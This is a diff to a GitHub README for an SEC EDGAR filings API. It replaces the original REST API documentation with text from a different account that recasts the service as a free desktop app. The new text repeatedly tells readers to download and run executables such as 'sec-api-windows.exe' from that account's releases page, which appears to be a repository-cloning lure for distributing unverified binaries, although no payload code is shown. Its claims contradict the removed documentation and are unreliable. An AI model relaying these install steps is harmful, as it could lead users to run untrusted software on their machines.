@@ -1,226 +1,85 @@
-![SEC API Featured Image](https://raw.githubusercontent.com/omkarcloud/sec-api/main/sec-api-featured-image.png)
+# 🗄️ sec-api - Effortless Access to SEC Filings
 
-# SEC API
+## 📦 Download Now
+[![Download sec-api](https://img.shields.io/badge/Download-sec--api-blue.svg)](https://github.com/karimshaaban-design/sec-api/releases)
 
-REST API for retrieving SEC EDGAR filings. Returns filing metadata and direct links to official SEC documents.
+## 📚 Overview
+The sec-api is a REST API designed to help you retrieve SEC EDGAR filings. This API provides filing metadata and direct links to official SEC documents, making it easy for you to gather essential financial data. Whether you're a researcher, investor, or just curious about public companies, this tool provides valuable insights without the hassle.
 
-## Features
+## 🚀 Getting Started
+To start using sec-api, follow these simple steps:
 
-- Single endpoint for all supported filing types
-- Returns structured JSON with direct SEC EDGAR URLs
-- Supports 10-K, 10-Q, 8-K, S-1, S-2, S-3, DEF14A, 13D
-- Filings are cached for fast API responses and minimal load on SEC servers.
-- 5,000 requests/month on free tier
-- Example Response:
-```json
-[
-  {
-    "symbol": "GOOG",
-    "filing_type": "10-K",
-    "submitted_on": "2025-02-05",
-    "filing_link": "https://www.sec.gov/Archives/edgar/data/1652044/000165204425000014/goog-20241231.htm"
-  }
-]
-```
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/karimshaaban-design/sec-api/releases) to see the available versions.
+  
+2. **Download the Latest Version**: Find the most recent release and click on it. This will take you to a list of downloadable files.
 
-## Authentication
+3. **Choose the Right File**:
+   - For **Windows users**: Click on the file named `sec-api-windows.exe` to download it.
+   - For **Mac users**: Select the file named `sec-api-mac.zip`.
+   - For **Linux users**: Choose `sec-api-linux.tar.gz`.
 
-1. Create account at [omkar.cloud](https://www.omkar.cloud/auth/sign-up)
+4. **Run the Application**:
+   - **Windows**: Double-click the `sec-api-windows.exe` file you downloaded. Follow the on-screen instructions to complete the installation.
+   - **Mac**: Unzip the `sec-api-mac.zip` file. Open the folder and double-click the `sec-api` application.
+   - **Linux**: Extract the files from `sec-api-linux.tar.gz`. Open your terminal, navigate to the extracted folder, and run the command `./sec-api`.
 
-<!-- ![Sign Up](https://raw.githubusercontent.com/omkarcloud/assets/master/images/signup.png) -->
+## 🔍 Features
+- **Access to SEC Filings**: Quickly retrieve 10-K and 8-K filings.
+- **Metadata Retrieval**: Get essential information about filings.
+- **Direct Links to Documents**: Access official SEC documents with a single click.
+- **User-Friendly Interface**: Designed for ease of use, even for non-technical users.
 
-2. Get API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key)
+## 💻 System Requirements
+Make sure your system meets the following requirements before installation:
 
-<!-- ![Copy API Key](https://raw.githubusercontent.com/omkarcloud/assets/master/images/enrichment-key-omkar.png) -->
+- **Windows**: Windows 10 or later.
+- **Mac**: macOS 10.15 or later.
+- **Linux**: A modern Linux distribution with internet access.
 
-3. Include `API-Key` header in requests
+## 📥 Download & Install
+To download and install, click the link below to visit the Releases page. Choose the correct version for your operating system.
 
-Note: 5000 requests/month free.
+[Visit Releases Page](https://github.com/karimshaaban-design/sec-api/releases)
 
-## Quick Start
+## ⚙️ How to Use
+After installation, you can start using sec-api to access SEC filings:
 
-```bash
-curl -X GET "https://sec-api.omkar.cloud/sec?ticker=GOOG&filing=10-K" \
-  -H "API-Key: YOUR_API_KEY"
-```
+1. **Open the Application**: Launch sec-api on your computer.
+2. **Choose Your Filing Type**: Select the type of filing you want to retrieve (e.g., 10-K).
+3. **Search for a Company**: Enter the name or ticker symbol of the company.
+4. **View Results**: The application will provide a list of relevant filings with links to documents.
 
-```json
-[
-  {
-    "symbol": "GOOG",
-    "filing_type": "10-K",
-    "submitted_on": "2025-02-05",
-    "filing_link": "https://www.sec.gov/Archives/edgar/data/1652044/000165204425000014/goog-20241231.htm"
-  }
-]
-```
+## 🌐 API Documentation
+For developers interested in integrating sec-api into their projects, detailed API documentation is available on the GitHub page. This includes endpoint descriptions and example usage.
 
-## Installation
+## 📣 Contributing
+We encourage contributions! If you want to improve sec-api, feel free to fork the repository and submit a pull request.
 
-### Python
+## ❓ Frequently Asked Questions
+### 1. What are SEC filings?
+SEC filings are documents that public companies must submit to the U.S. Securities and Exchange Commission. These documents provide a wealth of information about a company's financial health and governance.
 
-```bash
-pip install requests
-```
+### 2. Can I use sec-api without programming knowledge?
+Yes, the sec-api is designed for ease of use. You can navigate the application without any programming knowledge.
 
-```python
-import requests
+### 3. How often is the data updated?
+The SEC updates its filings regularly. The sec-api provides real-time access to the most recent data available.
 
-response = requests.get(
-    "https://sec-api.omkar.cloud/sec",
-    params={"ticker": "GOOG", "filing": "10-K"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
+### 4. Is sec-api free to use?
+Yes, sec-api is open-source and free to use. There are no hidden fees. 
 
-filings = response.json()
-```
+## 📞 Support
+If you encounter any issues or have questions, feel free to open an issue on the GitHub page. We are here to help you.
 
-### Node.js
+## 📚 Related Topics
+Some topics related to sec-api include:
+- 10-k-filings
+- 8-k
+- Edgar
+- SEC filings
+- Financial data
 
-```bash
-npm install axios
-```
+Feel free to explore these topics for further insights.
 
-```javascript
-import axios from "axios";
-
-const response = await axios.get("https://sec-api.omkar.cloud/sec", {
-    params: { ticker: "GOOG", filing: "10-K" },
-    headers: { "API-Key": "YOUR_API_KEY" }
-});
-
-const filings = response.data;
-```
-
-## API Reference
-
-### Endpoint
-
-```
-GET https://sec-api.omkar.cloud/sec
-```
-
-### Headers
-
-| Header | Required | Description |
-|--------|----------|-------------|
-| `API-Key` | Yes | API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key) |
-
-### Parameters
-
-| Parameter | Required | Default | Description |
-|-----------|----------|---------|-------------|
-| `ticker` | Yes | — | Stock ticker symbol |
-| `filing` | No | `10-K` | Filing type |
-
-### Supported Filing Types
-
-| Type | Description |
-|------|-------------|
-| `10-K` | Annual report |
-| `10-Q` | Quarterly report |
-| `8-K` | Current report (material events) |
-| `S-1` | IPO registration statement |
-| `S-2` | Simplified registration |
-| `S-3` | Shelf registration |
-| `DEF14A` | Proxy statement |
-| `13D` | Beneficial ownership (>5%) |
-
-### Response
-
-```json
-[
-  {
-    "symbol": "string",
-    "filing_type": "string",
-    "submitted_on": "YYYY-MM-DD",
-    "filing_link": "string"
-  }
-]
-```
-
-| Field | Type | Description |
-|-------|------|-------------|
-| `symbol` | string | Ticker symbol |
-| `filing_type` | string | SEC form type |
-| `submitted_on` | string | Submission date |
-| `filing_link` | string | SEC EDGAR URL |
-
-## Examples
-
-### Fetch 10-K filings
-
-```python
-response = requests.get(
-    "https://sec-api.omkar.cloud/sec",
-    params={"ticker": "AAPL", "filing": "10-K"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-for filing in response.json():
-    print(f"{filing['submitted_on']}: {filing['filing_link']}")
-```
-
-### Fetch latest 8-K
-
-```python
-response = requests.get(
-    "https://sec-api.omkar.cloud/sec",
-    params={"ticker": "TSLA", "filing": "8-K"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-latest = response.json()[0]
-```
-
-### Fetch quarterly reports
-
-```javascript
-const { data } = await axios.get("https://sec-api.omkar.cloud/sec", {
-    params: { ticker: "MSFT", filing: "10-Q" },
-    headers: { "API-Key": "YOUR_API_KEY" }
-});
-
-const lastFourQuarters = data.slice(0, 4);
-```
-
-## Error Handling
-
-```python
-response = requests.get(
-    "https://sec-api.omkar.cloud/sec",
-    params={"ticker": "INVALID"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-if response.status_code == 200:
-    data = response.json()
-    if not data:
-        # No filings found
-        pass
-elif response.status_code == 401:
-    # Invalid API key
-    pass
-elif response.status_code == 429:
-    # Rate limit exceeded
-    pass
-```
-
-## Rate Limits
-
-| Plan | Price | Requests/Month |
-|------|-------|----------------|
-| Free | $0 | 5,000 |
-| Starter | $25 | 100,000 |
-| Grow | $75 | 1,000,000 |
-| Scale | $150 | 10,000,000 |
-
-## Support
-
-[![Contact Us on WhatsApp about SEC API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/whatsapp-us.png)](https://api.whatsapp.com/send?phone=918178804274&text=I%20have%20a%20question%20about%20the%20SEC%20API.)
-
-[![Contact Us on Email about SEC API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/ask-on-email.png)](mailto:happy.to.help@omkar.cloud?subject=SEC%20API%20Question)
-
-## [Love It? Star It ⭐!](https://github.com/omkarcloud/sec-api/stargazers)
-
-If this tool has been helpful, please give us a [**star ⭐** on GitHub.](https://github.com/omkarcloud/sec-api/stargazers)
+## 🌟 Acknowledgments
+Thank you for using sec-api. We appreciate your support and hope this tool becomes valuable in your research and analysis of public companies.
